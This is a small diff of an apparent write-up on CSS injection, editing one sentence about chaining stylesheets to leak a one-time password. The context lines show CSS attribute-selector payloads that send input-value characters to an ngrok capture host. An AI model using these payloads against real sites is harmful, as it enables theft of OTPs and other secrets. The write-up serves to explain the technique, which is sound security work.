@@ -226,7 +226,7 @@ input[value^="bb"] { background-image: url("https://...ngrok.com/capture/bb") }
 input[value^="bZ"] { background-image: url("https://...ngrok.com/capture/bZ") }
 ```
 
-If the second character was `Z`, our server would receive a request to `https://...ngrok.com/capture/bZ`, from which it could have `https://...ngrok.com/style/2` with CSS to exfiltrate the next character, and so on.
+If the second character was `Z`, our server would receive a request to `https://...ngrok.com/capture/bZ`, from which it could have `https://...ngrok.com/style/2` respond with CSS to exfiltrate the next character, and so on.
 
 Eventually, this will exfiltrate the entire OTP, all with one payload!
 
